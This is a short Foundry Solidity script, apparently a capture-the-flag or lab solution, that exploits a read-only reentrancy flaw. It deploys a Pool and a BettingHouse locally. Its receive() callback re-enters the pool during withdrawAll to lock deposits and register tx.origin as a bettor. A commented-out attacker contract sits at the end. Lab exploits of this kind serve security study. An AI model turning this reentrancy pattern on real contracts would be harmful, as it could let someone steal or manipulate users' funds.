// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Pool, BettingHouse, DepositToken, WrappedToken} from "../../src/ReentrqancyView.sol";

import {Script, console} from "forge-std/Script.sol";

contract Mine is Script {
    Pool s_pool;
    BettingHouse s_provider;
    DepositToken s_depositToken;
    WrappedToken s_wrappedToken;

    function run() public {
        console.log("address this", address(this));

        // build contracts
        WrappedToken wrappedToken = new WrappedToken();
        DepositToken depositToken = new DepositToken();

        Pool pool = new Pool(address(wrappedToken), address(depositToken));
        BettingHouse provider = new BettingHouse(address(pool));

        depositToken.mint(address(this), 5);

        // set pool as tokens owners
        wrappedToken.transferOwnership(address(pool));
        depositToken.transferOwnership(address(pool));

        // set storage vars
        s_pool = pool;
        s_provider = provider;
        s_depositToken = depositToken;
        s_wrappedToken = wrappedToken;

        // vm.startBroadcast();

        pool.depositEther{value: 0.001 ether}();

        depositToken.approve(address(pool), 5);
        pool.depositPDT(5);

        console.log("Balance", pool.balanceOf(address(this)));

        pool.withdrawAll();

        // vm.stopBroadcast();

        console.log("Is Bettor", provider.isBettor(tx.origin));
    }

    // fallback() external payable {}

    receive() external payable {
        console.log("Received");
        // approve
        Pool pool = s_pool;
        s_depositToken.approve(address(pool), 5);
        pool.depositPDT(5);
        pool.lockDeposits();

        s_provider.makeBet(tx.origin);
    }
}

// contract Attker {
//     function attack(address _target) public payable {
//         (bool success, bytes memory returnData) = _target.call{
//             value: msg.value
//         }("");
//         require(success, "Attack failed");
//     }
// }
